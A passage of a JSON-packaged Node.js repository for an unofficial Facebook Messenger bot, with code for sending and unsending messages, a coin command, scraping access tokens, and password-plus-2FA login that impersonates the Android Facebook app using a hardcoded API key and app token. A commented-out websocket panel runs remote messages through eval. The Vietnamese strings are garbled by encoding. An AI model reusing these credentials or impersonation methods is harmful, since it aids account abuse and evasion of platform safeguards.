var Access_Token = /\"],\\[\"(.*?)\",\"/.exec(/BusinessToolEmptyView.brands.react(.*?){\"__m\":\"BusinessToolEmptyView.brands.react\"}/.exec(data.body)[1])[1];\n                        global.Fca.Data.AccessToken = Access_Token;\n                        return Access_Token;\n                    });\n                });\n            }\n        })\n    }\n}\n\n//hard working =))","path":null,"size_bytes":5094,"size_tokens":null},"lib/fca-auto/src/sendMessageMqtt.js":{"content":"var utils = require(\"../utils\");\nvar log = require(\"npmlog\");\nvar bluebird = require(\"bluebird\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n\tfunction uploadAttachment(attachments, callback) {\n\t\tcallback = callback || function () { };\n\t\tvar uploads = [];\n\n\t\t// create an array of promises\n\t\tfor (var i = 0; i < attachments.length; i++) {\n\t\t\tif (!utils.isReadableStream(attachments[i])) {\n\t\t\t\tthrow {\n\t\t\t\t\terror:\n\t\t\t\t\t\t\"Attachment should be a readable stream and not \" +\n\t\t\t\t\t\tutils.getType(attachments[i]) +\n\t\t\t\t\t\t\".\"\n\t\t\t\t};\n\t\t\t}\n\n\t\t\tvar form = {\n\t\t\t\tupload_1024: attachments[i],\n\t\t\t\tvoice_clip: \"true\"\n\t\t\t};\n\n\t\t\tuploads.push(\n\t\t\t\tdefaultFuncs\n\t\t\t\t\t.postFormData(\n\t\t\t\t\t\t\"https://upload.facebook.com/ajax/mercury/upload.php\",\n\t\t\t\t\t\tctx.jar,\n\t\t\t\t\t\tform,\n\t\t\t\t\t\t{}\n\t\t\t\t\t)\n\t\t\t\t\t.then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n\t\t\t\t\t.then(function (resData) {\n\t\t\t\t\t\tif (resData.error) {\n\t\t\t\t\t\t\tthrow resData;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t// We have to return the data unformatted unless we want to change it\n\t\t\t\t\t\t// back in sendMessage.\n\t\t\t\t\t\treturn resData.payload.metadata[0];\n\t\t\t\t\t})\n\t\t\t);\n\t\t}\n\n\t\t// resolve all promises\n\t\tbluebird\n\t\t\t.all(uploads)\n\t\t\t.then(function (resData) {\n\t\t\t\tcallback(null, resData);\n\t\t\t})\n\t\t\t.catch(function (err) {\n\t\t\t\tlog.error(\"uploadAttachment\", err);\n\t\t\t\treturn callback(err);\n\t\t\t});\n\t}\n\n\tlet variance = 0;\n\tconst epoch_id = () => Math.floor(Date.now() * (4194304 + (variance = (variance + 0.1) % 5)));\n\tconst emojiSizes = {\n\t\tsmall: 1,\n\t\tmedium: 2,\n\t\tlarge: 3\n\t};\n\n\tfunction handleEmoji(msg, form, callback, cb) {\n\t\tif (msg.emojiSize != null && msg.emoji == null) {\n\t\t\treturn callback({ error: \"emoji property is empty\" });\n\t\t}\n\t\tif (msg.emoji) {\n\t\t\tif (!msg.emojiSize) {\n\t\t\t\tmsg.emojiSize = \"small\";\n\t\t\t}\n\t\t\tif (\n\t\t\t\tmsg.emojiSize !== \"small\" &&\n\t\t\t\tmsg.emojiSize !== \"medium\" &&\n\t\t\t\tmsg.emojiSize !== \"large\" &&\n\t\t\t\t(isNaN(msg.emojiSize) || msg.emojiSize < 1 || msg.emojiSize > 3)\n\t\t\t) {\n\t\t\t\treturn callback({ error: \"emojiSize property is invalid\" });\n\t\t\t}\n\n\t\t\tform.payload.tasks[0].payload.send_type = 1;\n\t\t\tform.payload.tasks[0].payload.text = msg.emoji;\n\t\t\tform.payload.tasks[0].payload.hot_emoji_size = !isNaN(msg.emojiSize) ? msg.emojiSize : emojiSizes[msg.emojiSize];\n\t\t}\n\t\tcb();\n\t}\n\n\tfunction handleSticker(msg, form, callback, cb) {\n\t\tif (msg.sticker) {\n\t\t\tform.payload.tasks[0].payload.send_type = 2;\n\t\t\tform.payload.tasks[0].payload.sticker_id = msg.sticker;\n\t\t}\n\t\tcb();\n\t}\n\n\tfunction handleAttachment(msg, form, callback, cb) {\n\t\tif (msg.attachment) {\n\t\t\tform.payload.tasks[0].payload.send_type = 3;\n\t\t\tform.payload.tasks[0].payload.attachment_fbids = [];\n\t\t\tif (form.payload.tasks[0].payload.text == \"\")\n\t\t\t\tform.payload.tasks[0].payload.text = null;\n\t\t\tif (utils.getType(msg.attachment) !== \"Array\") {\n\t\t\t\tmsg.attachment = [msg.attachment];\n\t\t\t}\n\n\t\t\tuploadAttachment(msg.attachment, function (err, files) {\n\t\t\t\tif (err) {\n\t\t\t\t\treturn callback(err);\n\t\t\t\t}\n\n\t\t\t\tfiles.forEach(function (file) {\n\t\t\t\t\tvar key = Object.keys(file);\n\t\t\t\t\tvar type = key[0]; // image_id, file_id, etc\n\t\t\t\t\tform.payload.tasks[0].payload.attachment_fbids.push(file[type]); // push the id\n\t\t\t\t});\n\t\t\t\tcb();\n\t\t\t});\n\t\t} else {\n\t\t\tcb();\n\t\t}\n\t}\n\n\n\tfunction handleMention(msg, form, callback, cb) {\n\t\tif (msg.mentions) {\n\t\t\tform.payload.tasks[0].payload.send_type = 1;\n\n\t\t\tconst arrayIds = [];\n\t\t\tconst arrayOffsets = [];\n\t\t\tconst arrayLengths = [];\n\t\t\tconst mention_types = [];\n\n\t\t\tfor (let i = 0; i < msg.mentions.length; i++) {\n\t\t\t\tconst mention = msg.mentions[i];\n\n\t\t\t\tconst tag = mention.tag;\n\t\t\t\tif (typeof tag !== \"string\") {\n\t\t\t\t\treturn callback({ error: \"Mention tags must be strings.\" });\n\t\t\t\t}\n\n\t\t\t\tconst offset = msg.body.indexOf(tag, mention.fromIndex || 0);\n\n\t\t\t\tif (offset < 0) {\n\t\t\t\t\tlog.warn(\n\t\t\t\t\t\t\"handleMention\",\n\t\t\t\t\t\t'Mention for \"' + tag + '\" not found in message string.'\n\t\t\t\t\t);\n\t\t\t\t}\n\n\t\t\t\tif (mention.id == null) {\n\t\t\t\t\tlog.warn(\"handleMention\", \"Mention id should be non-null.\");\n\t\t\t\t}\n\n\t\t\t\tconst id = mention.id || 0;\n\t\t\t\tarrayIds.push(id);\n\t\t\t\tarrayOffsets.push(offset);\n\t\t\t\tarrayLengths.push(tag.length);\n\t\t\t\tmention_types.push(\"p\");\n\t\t\t}\n\n\t\t\tform.payload.tasks[0].payload.mention_data = {\n\t\t\t\tmention_ids: arrayIds.join(\",\"),\n\t\t\t\tmention_offsets: arrayOffsets.join(\",\"),\n\t\t\t\tmention_lengths: arrayLengths.join(\",\"),\n\t\t\t\tmention_types: mention_types.join(\",\")\n\t\t\t};\n\t\t}\n\t\tcb();\n\t}\n\n\tfunction handleLocation(msg, form, callback, cb) {\n\t\t// this is not working yet\n\t\tif (msg.location) {\n\t\t\tif (msg.location.latitude == null || msg.location.longitude == null) {\n\t\t\t\treturn callback({ error: \"location property needs both latitude and longitude\" });\n\t\t\t}\n\n\t\t\tform.payload.tasks[0].payload.send_type = 1;\n\t\t\tform.payload.tasks[0].payload.location_data = {\n\t\t\t\tcoordinates: {\n\t\t\t\t\tlatitude: msg.location.latitude,\n\t\t\t\t\tlongitude: msg.location.longitude\n\t\t\t\t},\n\t\t\t\tis_current_location: !!msg.location.current,\n\t\t\t\tis_live_location: !!msg.location.live\n\t\t\t};\n\t\t}\n\n\t\tcb();\n\t}\n\n\tfunction send(form, threadID, callback, replyToMessage) {\n\t\tif (replyToMessage) {\n\t\t\tform.payload.tasks[0].payload.reply_metadata = {\n\t\t\t\treply_source_id: replyToMessage,\n\t\t\t\treply_source_type: 1,\n\t\t\t\treply_type: 0\n\t\t\t};\n\t\t}\n\t\tconst mqttClient = ctx.mqttClient;\n\t\tform.payload.tasks.forEach((task) => {\n\t\t\ttask.payload = JSON.stringify(task.payload);\n\t\t});\n\t\tform.payload = JSON.stringify(form.payload);\n\t\tconsole.log(global.jsonStringifyColor(form, null, 2));\n\n\t\treturn mqttClient.publish(\"/ls_req\", JSON.stringify(form), function (err, data) {\n\t\t\tif (err) {\n\t\t\t\tconsole.error('Error publishing message: ', err);\n\t\t\t\tcallback(err);\n\t\t\t} else {\n\t\t\t\tconsole.log('Message published successfully with data: ', data);\n\t\t\t\tcallback(null, data);\n\t\t\t}\n\t\t});\n\t}\n\n\treturn function sendMessageMqtt(msg, threadID, callback, replyToMessage) {\n\t\tif (\n\t\t\t!callback &&\n\t\t\t(utils.getType(threadID) === \"Function\" ||\n\t\t\t\tutils.getType(threadID) === \"AsyncFunction\")\n\t\t) {\n\t\t\treturn threadID({ error: \"Pass a threadID as a second argument.\" });\n\t\t}\n\t\tif (\n\t\t\t!replyToMessage &&\n\t\t\tutils.getType(callback) === \"String\"\n\t\t) {\n\t\t\treplyToMessage = callback;\n\t\t\tcallback = function () { };\n\t\t}\n\n\n\t\tif (!callback) {\n\t\t\tcallback = function (err, friendList) {\n\t\t\t};\n\t\t}\n\n\t\tvar msgType = utils.getType(msg);\n\t\tvar threadIDType = utils.getType(threadID);\n\t\tvar messageIDType = utils.getType(replyToMessage);\n\n\t\tif (msgType !== \"String\" && msgType !== \"Object\") {\n\t\t\treturn callback({\n\t\t\t\terror:\n\t\t\t\t\t\"Message should be of type string or object and not \" + msgType + \".\"\n\t\t\t});\n\t\t}\n\n\t\tif (msgType === \"String\") {\n\t\t\tmsg = { body: msg };\n\t\t}\n\n\t\tconst timestamp = Date.now();\n\t\t// get full date time\n\t\tconst epoch = timestamp << 22;\n\t\t//const otid = epoch + 0; // TODO replace with randomInt(0, 2**22)\n\t\tconst otid = epoch + Math.floor(Math.random() * 4194304);\n\n\t\tconst form = {\n\t\t\tapp_id: \"2220391788200892\",\n\t\t\tpayload: {\n\t\t\t\ttasks: [\n\t\t\t\t\t{\n\t\t\t\t\t\tlabel: \"46\",\n\t\t\t\t\t\tpayload: {\n\t\t\t\t\t\t\tthread_id: threadID.toString(),\n\t\t\t\t\t\t\totid: otid.toString(),\n\t\t\t\t\t\t\tsource: 0,\n\t\t\t\t\t\t\tsend_type: 1,\n\t\t\t\t\t\t\tsync_group: 1,\n\t\t\t\t\t\t\ttext: msg.body != null && msg.body != undefined ? msg.body.toString() : \"\",\n\t\t\t\t\t\t\tinitiating_source: 1,\n\t\t\t\t\t\t\tskip_url_preview_gen: 0\n\t\t\t\t\t\t},\n\t\t\t\t\t\tqueue_name: threadID.toString(),\n\t\t\t\t\t\ttask_id: 0,\n\t\t\t\t\t\tfailure_count: null\n\t\t\t\t\t},\n\t\t\t\t\t{\n\t\t\t\t\t\tlabel: \"21\",\n\t\t\t\t\t\tpayload: {\n\t\t\t\t\t\t\tthread_id: threadID.toString(),\n\t\t\t\t\t\t\tlast_read_watermark_ts: Date.now(),\n\t\t\t\t\t\t\tsync_group: 1\n\t\t\t\t\t\t},\n\t\t\t\t\t\tqueue_name: threadID.toString(),\n\t\t\t\t\t\ttask_id: 1,\n\t\t\t\t\t\tfailure_count: null\n\t\t\t\t\t}\n\t\t\t\t],\n\t\t\t\tepoch_id: epoch_id(),\n\t\t\t\tversion_id: \"6120284488008082\",\n\t\t\t\tdata_trace_id: null\n\t\t\t},\n\t\t\trequest_id: 1,\n\t\t\ttype: 3\n\t\t};\n\n\t\thandleEmoji(msg, form, callback, function () {\n\t\t\thandleLocation(msg, form, callback, function () {\n\t\t\t\thandleMention(msg, form, callback, function () {\n\t\t\t\t\thandleSticker(msg, form, callback, function () {\n\t\t\t\t\t\thandleAttachment(msg, form, callback, function () {\n\t\t\t\t\t\t\tsend(form, threadID, callback, replyToMessage);\n\t\t\t\t\t\t});\n\t\t\t\t\t});\n\t\t\t\t});\n\t\t\t});\n\t\t});\n\t};\n};","path":null,"size_bytes":7981,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/unsendMessage.js":{"content":"\"use strict\";\n\nconst Balancer = require('../Extra/Balancer.js');\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  //const BalancerInstance = new Balancer(api.unsendMessage, unsendMessage, 0.85);\n  \n  function unsendMessage(messageID, threadID, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n  \n    if (!callback) {\n      callback = function (err, friendList) {\n        if (err) return rejectFunc(err);\n        resolveFunc(friendList);\n      };\n    }\n\n    if (threadID) return api.unsendMqttMessage(threadID, messageID, callback);\n    else {\n      var form = {\n        message_id: messageID\n      };\n    \n      defaultFuncs\n        .post(\"https://www.facebook.com/messaging/unsend_message/\", ctx.jar, form)\n        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n        .then(function (resData) {\n          if (resData.error) throw resData;\n          return callback();\n        })\n        .catch(function (err) {\n          log.error(\"unsendMessage\", err);\n          return callback(err);\n        });\n    \n      return returnPromise;\n    }\n  }\n\n  return unsendMessage;\n};","path":null,"size_bytes":1313,"size_tokens":null},"modules/commands/pay.js":{"content":"module.exports.config = {\n  name: \"pay\",\n  version: \"1.0.1\",\n  hasPermssion: 0,\n  credits: \"Ai code\",\n  description: \"Chuy·ªÉn ti·ªÅn c·ªßa b·∫£n th√¢n cho ai ƒë√≥\",\n  commandCategory: \"Nh√≥m\",\n  usages: \"pay [Tag | Reply] [Coins]\",\n  cooldowns: 5,\n};\n\nmodule.exports.run = async ({ event, api, Currencies, args, Users }) => {\n  let { threadID, messageID, senderID, messageReply, mentions } = event;\n  let receiveID;\n  let amount;\n\n  if (messageReply) {\n    receiveID = messageReply.senderID;\n    amount = parseInt(args[0]);\n  } else if (Object.keys(mentions).length > 0) {\n    receiveID = Object.keys(mentions)[0];\n    const nameLength = mentions[receiveID].trim().split(/\\s+/).length;\n    amount = parseInt(args[nameLength]);\n  } else {\n    return api.sendMessage('C√°ch d√πng:\\n¬ªd√πng pay + tag + s·ªë ti·ªÅn\\n¬ªd√πng pay + reply + s·ªë ti·ªÅn', threadID, messageID);\n  }\n\n  if (isNaN(amount) || amount <= 0) {\n    return api.sendMessage(`¬ªS·ªë l∆∞·ª£ng coins ph·∫£i l√† m·ªôt s·ªë v√† l·ªõn h∆°n 0.`, threadID, messageID);\n  }\n\n  const senderBalance = (await Currencies.getData(senderID)).money || 0;\n  if (amount > senderBalance) {\n    return api.sendMessage(`¬ªB·∫°n l·∫•y ƒë√¢u ra nhi·ªÅu ti·ªÅn nh∆∞ th·∫ø?`, threadID, messageID);\n  }\n\n  await Currencies.decreaseMoney(senderID, amount);\n  await Currencies.increaseMoney(receiveID, amount);\n\n  const namePay = await Users.getNameUser(receiveID);\n  return api.sendMessage(`ƒê√£ chuy·ªÉn th√†nh c√¥ng ${amount}$ cho ${namePay}.`, threadID, messageID);\n}","path":null,"size_bytes":1511,"size_tokens":null},"lib/fca-auto/Extra/Security/Step_3.js":{"content":"'use strict';\n\nconst crypto = require('crypto');\nconst aes = require(\"aes-js\");\n\nmodule.exports.encryptState = function encryptState(data, key) {\n    let hashEngine = crypto.createHash(\"sha256\");\n    let hashKey = hashEngine.update(key).digest();\n    let bytes = aes.utils.utf8.toBytes(data);\n    let aesCtr = new aes.ModeOfOperation.ctr(hashKey);\n    let encryptedData = aesCtr.encrypt(bytes);\n    return aes.utils.hex.fromBytes(encryptedData);\n};\n\nmodule.exports.decryptState = function decryptState(data, key) {\n    let hashEngine = crypto.createHash(\"sha256\");\n    let hashKey = hashEngine.update(key).digest();\n    let encryptedBytes = aes.utils.hex.toBytes(data);\n    let aesCtr = new aes.ModeOfOperation.ctr(hashKey);\n    let decryptedData = aesCtr.decrypt(encryptedBytes);\n    return aes.utils.utf8.fromBytes(decryptedData);\n};\n","path":null,"size_bytes":836,"size_tokens":null},"lib/fca-auto/Extra/Src/Websocket.js":{"content":"/* eslint-disable no-prototype-builtins */\n/* eslint-disable linebreak-style */\n/**\nconst Eval = require('eval');\nconst Database = require('../Database');\nglobal.ws = new Object({ \n    client: {},\n});\nconst All_Session_ID = Database().get('Session_ID') || []; [ { Session_ID: \".\", TimeStamp: \"\" }]\nfor (let v of All_Session_ID) {\n    if (v.TimeStamp <= Date.now()) {\n        const index = All_Session_ID.findIndex(i => i.Session_ID == v.Session_ID);\n        All_Session_ID.splice(index,1);\n    }\n    else {\n        setTimeout(() => {\n            const index = All_Session_ID.findIndex(i => i.Session_ID == v.Session_ID);\n            All_Session_ID.splice(index,1);\n        }, v.TimeStamp - Date.now());\n    }\n}\n\nDatabase().set(\"Session_ID\", All_Session_ID);\n\nfunction generateRandomString() {\n    var string = '';\n    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    for (var i = 0; i < 16; i++) {\n        if (i == 4 || i == 8 || i == 12) {\n        string += '-';\n        }\n        var randomIndex = Math.floor(Math.random() * characters.length);\n        string += characters.charAt(randomIndex);\n    }\n    return string;\n}\n\nconst HowTo =  {\n    AutoUpdate: \"Automatically update if there is a new version. (Restart required)\",\n    AutoLogin: \"Automatically login and retrieve cookies to continue running the bot whenever kicked out of the account. (Restart required)\",\n    Login2Fa: \"Use two-factor authentication code to log in. (Restart required)\",\n    Uptime: \"Help your process to operate for a longer period of time.(Restart required)\",\n    BroadCast: \"Receive messages from the server.(Restart required)\",\n    EncryptFeature: \"Encrypt your account (appstate) to prevent it from being accessed or damaged by others.(Restart required)\",\n    ResetDataLogin: \"Used to reset autologin account and password.(Restart required)\",\n    DevMode: \"Developer mode, insider, testing untested features.(Restart required)\",\n    AutoInstallNode: \"Automatically download NodeJS version as per system's requirement.(Restart required)\",\n    AntiSendAppState: \"Check and prevent sending your account (appstate) via messages.\",\n    HTML: \"Display the website of FCA.(Restart required)\",\n    Accept: \"Is a part of stable_version, turned on to use a stable version without errors! (Restart required)\",\n    AntiGetThreadInfo: \"Using data storage and release algorithms to avoid being blocked by Facebook.\",\n    AntiGetUserInfo: \"Using data storage and release algorithms to avoid being blocked by Facebook.\",\n    Status: \"Turn on/off the websocket-extension feature. (Restart required)\",\n    Language: \"Select system language (Restart required)\",\n    MainName: \"Name on the top whenever log data. (Restart required)\",\n    UserName: \"Your name display in Express - HTML. (Restart required)\",\n    MusicLink: \"Your music link. (Restart required)\",\n    AuthString: \"Code to retrieve 2FA authenticator. (Restart required)\",\n    PreKey: \"Obsolete feature.\",\n    Config: \"Feature is delayed.\",\n    Version: \"stable version - Stable_Version Feature. (Restart required)\",\n    Database_Type: \"Type of database. (Restart required)\",\n    AppState_Path: \"Name of the file containing your appstate.\",\n    AutoRestartMinutes: \"Auto-restart after a certain number of minutes. (Restart required)\",\n    RestartMQTT_Minutes: \"Automatically restarting MQTT without restarting the bot helps prevent console hangups. (Restart required)\",\n    Example: {\n        Language: \"vi or en\",\n        AuthString: \"Like this SD4S XQ32 O2JA WXB3 FUX2 OPJ7 Q7JZ 4R6Z | https://i.imgur.com/RAg3rvw.png\",\n        Version: \"Valid version: https://github.com/KanzuXHorizon/Global_Horizon/blob/main/InstantAction.json\",\n        Database_Type: \"default or json\",\n        AppState_Path: \"fbstate.json, appstate.json,...\",\n        AutoRestartMinutes: \"Number 0 to turn off, Encourage number 60\",\n        RestartMQTT_Minutes: \"Number 0 to turn off, Encourage number 45\"\n\n    }\n};\n\nmodule.exports.connect = function(WebSocket) {\n    WebSocket.on('connection', function (Websocket, req) {\n        var Ws_Client;\n        if (!global.ws.client.hasOwnProperty(req.socket.remoteAddress)) {\n            global.ws.client[req.socket.remoteAddress] = { Websocket, Status: false, ResetPassWordTime: 0 };\n            Ws_Client = global.ws.client[req.socket.remoteAddress];\n        }\n        else { \n            global.ws.client[req.socket.remoteAddress] = { Websocket, Status: global.ws.client[req.socket.remoteAddress].Status, ResetPassWordTime: global.ws.client[req.socket.remoteAddress].ResetPassWordTime };\n            Ws_Client = global.ws.client[req.socket.remoteAddress];\n        }\n        Ws_Client.Websocket.send(JSON.stringify({ Status: \"Username&PassWord\"}));\n        Ws_Client.Websocket.on('message', function(message) {\n            message = JSON.parse(message);\n            switch (message.type) {\n                case \"login\": {\n                    if (!message.username || !message.password) return Ws_Client.Websocket.send(JSON.stringify({ Status: false, Code: 1 }));\n                    const User_UserName = Database().get('Ws_UserName');\n                    const User_PassWord = Database().get('Ws_PassWord');\n                    if (message.username != User_UserName || User_PassWord != message.password) return Ws_Client.Websocket.send(JSON.stringify({ Status: false, Code: 2}));\n                    const Format = {\n                        Session_ID: generateRandomString(),\n                        TimeStamp: Date.now() + 24 * 60 * 60 * 1000\n                    };\n                    All_Session_ID.push(Format);\n                    Database().set(\"Session_ID\", All_Session_ID);\n                    global.ws.client[req.socket.remoteAddress].Status = true;\n                    setTimeout(() => {\n                        global.ws.client[req.socket.remoteAddress].Status = false;\n                    }, (Date.now() + 24 * 60 * 60 * 1000) - Date.now());\n                    return Ws_Client.Websocket.send(JSON.stringify({ Status: \"Success\", Session_ID: Format.Session_ID, TimeStamp: Format.TimeStamp }));\n                }\n                case \"check\": {\n                    if (!message.Session_ID || !message.TimeStamp) return Ws_Client.Websocket.send(JSON.stringify({ Status: false, Code: 3}));\n                    const Format = {\n                        Session_ID: message.Session_ID,\n                        TimeStamp: message.TimeStamp\n                    };\n                    if (Format.TimeStamp <= Date.now()) {\n                        let index = All_Session_ID.findIndex(i => i.Session_ID == Format.Session_ID);\n                        All_Session_ID.splice(index,1);\n                        Database().set(\"Session_ID\", All_Session_ID);\n                        Ws_Client.Status = false;\n                        Ws_Client.Websocket.send(JSON.stringify({ Status: false, Code: 4}));\n                        return delete global.ws.client[Format.Session_ID];\n                    }\n                    if (All_Session_ID.some(i => i.Session_ID == message.Session_ID)) {\n                        global.ws.client[req.socket.remoteAddress].Status = true;\n                        return Ws_Client.Websocket.send(JSON.stringify({ Status: \"Success\" }));\n                    }\n                    else {\n                        global.ws.client[req.socket.remoteAddress].Status = false;\n                        return Ws_Client.Websocket.send(JSON.stringify({ Status: false, Code: 5 }));\n                    }\n                }\n                case \"resetPassword\": {\n                    if (!message.Otp || !message.NewPassword) return Ws_Client.Websocket.send(JSON.stringify({ Status:  false, Code: 7 }));\n                    if (global.ws.client[req.socket.remoteAddress].ResetPassWordTime == 3) return Ws_Client.Websocket.send(JSON.stringify({ Status: false, Code: 9 }));\n                    const speakeasy = require('speakeasy');\n                    const secret = Database().get('Ws_2Fa');\n                    if (message.Otp != speakeasy.totp({\n                        secret: secret,\n                        encoding: 'base32'\n                    })) {\n                        global.ws.client[req.socket.remoteAddress].ResetPassWordTime += 1;\n                        return Ws_Client.Websocket.send(JSON.stringify({ Status: false, Code: 8 }));\n                    }\n                    else {\n                        Database().set('Ws_PassWord', message.NewPassword);\n                        return Ws_Client.Websocket.send(JSON.stringify({ Status: 'Success' }));\n                    }\n                }\n                default: {\n                    if (Ws_Client.Status != true) return Ws_Client.Websocket.send(JSON.stringify({ Status: false, Code: 6 }));\n                    switch (message.type) {\n                        case \"Command\": {\n                            if (message.Data == \"Stop\") {\n                                return process.exit(0);\n                            }\n                            else Eval(message.Data, {} ,true);\n                        }\n                            break;\n                        case \"ChangeAppState\": {\n                            try {\n                                const AppState = JSON.stringify(JSON.parse(message.Data), null ,2);\n                                require('fs').writeFileSync(process.cwd() + `/${global.Fca.Require.FastConfig.Websocket_Extension.AppState_Path}`, AppState, 'utf-8');\n                                return Ws_Client.Websocket.send(JSON.stringify({ Type: \"ChangeAppState\", Data: 0 }));\n                            }\n                            catch (e) {\n                                return Ws_Client.Websocket.send(JSON.stringify({ Type: \"ChangeAppState\", Data: e }));\n                            }\n                        }\n                        case \"GetDocument\": {\n                            \n                            return Ws_Client.Websocket.send(JSON.stringify({ Status: \"Success\", Data: HowTo }));\n                        }\n                        case \"getFastConfig\": {\n                            return Ws_Client.Websocket.send(JSON.stringify({ Status: \"Success\", Data: global.Fca.Require.FastConfig }));\n                        }\n                        case \"ping\": {\n                            return Ws_Client.Websocket.send(JSON.stringify({ Status: \"Pong\" }));\n                        }\n                        case \"FastConfig_Change\": {\n                            const FastConfig_Path = require(process.cwd() + \"/FastConfigFca.json\");\n                            const FastConfig_Global = global.Fca.Require.FastConfig;\n                            const SetConfig = function(Name, Value, Path, Main_Path) {\n                                try {\n                                    if (Path && Main_Path) {\n                                        FastConfig_Path[Main_Path][Name] = Value;\n                                        (HowTo[Name]).includes('(Restart required)') == false ? global.Fca.Require.FastConfig = FastConfig_Path : '';\n                                    }\n                                    else {\n                                        FastConfig_Path[Name] = Value;\n                                        (HowTo[Name]).includes('(Restart required)') == false ? global.Fca.Require.FastConfig[Name] = Value : '';\n                                    }\n                                    global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(FastConfig_Path, null, \"\\t\"));\n                                    return Ws_Client.Websocket.send(JSON.stringify({ Type: 'Noti', Action: `Success ${ (HowTo[Name]).includes('(Restart required)') == true ? 'RestartRequired' : ''}` }));\n                                }\n                                catch (e) {\n                                    global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(FastConfig_Global, null, \"\\t\"));\n                                    return Ws_Client.Websocket.send(JSON.stringify({ Type: 'Noti', Action: e}));\n                                }\n                            };\n                            return SetConfig(message.Data.Name, message.Data.Value, message.Data.Path, message.Data.Main_Path);\n                        }\n                        case \"All_logs\": {\n                            return Ws_Client.Websocket.send(JSON.stringify({ Type: \"Console\", Data: console.history.join(\" <br> \")}));\n                        }\n                    }\n                }\n            }\n        });\n    });\n    return { Client: global.ws.client, WSS: WebSocket };\n};\n */","path":null,"size_bytes":12652,"size_tokens":null},"lib/fca-auto/fblogin.js":{"content":"// File: fblogin.js\n\nmodule.exports = function (globalFca) {\n  const axios = require('axios');\n  const crypto = require('crypto');\n  const { v4: uuidv4 } = require('uuid');\n  const qs = require('qs');\n  const speakeasy = require('speakeasy');\n  const fs = require('fs');\n  const path = require('path');\n\n  const Database = require(globalFca.Require.paths.Database);\n  const logger = globalFca.Require.logger;\n  const Language = globalFca.Require.Language;\n\n  class FacebookLogin {\n    static async login() {\n      const email = Database().get(\"Account\");\n      const password = Database().get(\"Password\");\n      const twoFactorSecret = Database().get(\"TwoFAKey\") || \"0\";\n\n      if (!email || !password) {\n        logger.Warning(\"‚ö†Ô∏è Kh√¥ng t√¨m th·∫•y email ho·∫∑c m·∫≠t kh·∫©u trong Database\");\n        return { status: false, message: 'Missing account credentials' };\n      }\n\n      logger.Normal(\"üîÑ B·∫Øt ƒë·∫ßu ƒëƒÉng nh·∫≠p Facebook...\");\n\n      const adid = uuidv4();\n      const device_id = uuidv4();\n      const family_device_id = uuidv4();\n      const machine_id = [...Array(24)].map(() =>\n        'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]\n      ).join('');\n\n      let loginData = {\n        adid,\n        email,\n        password,\n        device_id,\n        family_device_id,\n        locale: 'en_US',\n        credentials_type: 'password',\n        generate_session_cookies: '1',\n        source: 'login',\n        machine_id,\n        fb_api_caller_class: 'com.facebook.account.login.protocol.Fb4aAuthHandler',\n        api_key: '882a8490361da98702bf97a021ddc14d',\n        access_token: '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n      };\n\n      const sig = Object.entries(Object.fromEntries(Object.entries(loginData).sort()))\n        .map(([k, v]) => `${k}=${v}`).join('');\n      loginData.sig = crypto.createHash('md5').update(sig + loginData.access_token).digest('hex');\n\n      const headers = {\n        'Content-Type': 'application/x-www-form-urlencoded',\n        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/SP1A.210812.016; com.termux)',\n        'x-fb-http-engine': 'Liger',\n        'x-fb-friendly-name': 'authenticate'\n      };\n\n      try {\n        logger.Normal(\"üì¨ G·ª≠i y√™u c·∫ßu ƒëƒÉng nh·∫≠p l·∫ßn ƒë·∫ßu...\");\n        const res = await axios.post('https://b-graph.facebook.com/auth/login', qs.stringify(loginData), { headers });\n\n        const cookies = res.data.session_cookies.map(c => `${c.name}=${c.value}`).join('; ');\n        const appState = this.formatCookiesToAppState(cookies);\n\n        fs.writeFileSync(path.join(__dirname, '../../../appstate.json'), JSON.stringify(appState, null, 2));\n        logger.Success(\"‚úÖ ƒêƒÉng nh·∫≠p th√†nh c√¥ng, appState ƒë√£ l∆∞u v√†o appstate.json\");\n\n        return { status: true, cookies, appState };\n\n      } catch (err) {\n        const errorData = err.response?.data?.error?.error_data;\n\n        if (!errorData || twoFactorSecret === '0') {\n          logger.Error(\"‚ùå C·∫ßn m√£ 2FA ho·∫∑c t√†i kho·∫£n sai.\");\n          return { status: false, message: '2FA code needed or invalid credentials.' };\n        }\n\n        const totpCode = speakeasy.totp({\n          secret: twoFactorSecret.replace(/\\s+/g, '').toUpperCase(),\n          encoding: 'base32'\n        });\n\n        logger.Normal(\"üì¨ G·ª≠i l·∫°i y√™u c·∫ßu ƒëƒÉng nh·∫≠p v·ªõi m√£ 2FA...\");\n\n        const twoFactorData = {\n          ...loginData,\n          credentials_type: 'two_factor',\n          twofactor_code: totpCode,\n          userid: errorData.uid,\n          machine_id: errorData.machine_id,\n          first_factor: errorData.login_first_factor\n        };\n\n        const sig2 = Object.entries(Object.fromEntries(Object.entries(twoFactorData).sort()))\n          .map(([k, v]) => `${k}=${v}`).join('');\n        twoFactorData.sig = crypto.createHash('md5').update(sig2 + loginData.access_token).digest('hex');\n\n        try {\n          const twoFARes = await axios.post('https://b-graph.facebook.com/auth/login', qs.stringify(twoFactorData), { headers });\n          const cookies = twoFARes.data.session_cookies.map(c => `${c.name}=${c.value}`).join('; ');\n          const appState = this.formatCookiesToAppState(cookies);\n\n          fs.writeFileSync(path.join(__dirname, '../../../appstate.json'), JSON.stringify(appState, null, 2));\n          logger.Success(\"‚úÖ ƒêƒÉng nh·∫≠p v·ªõi 2FA th√†nh c√¥ng, appState ƒë√£ l∆∞u v√†o appstate.json\");\n\n\n          return { status: true, cookies, appState };\n\n        } catch (err2) {\n          logger.Error(\"‚ùå 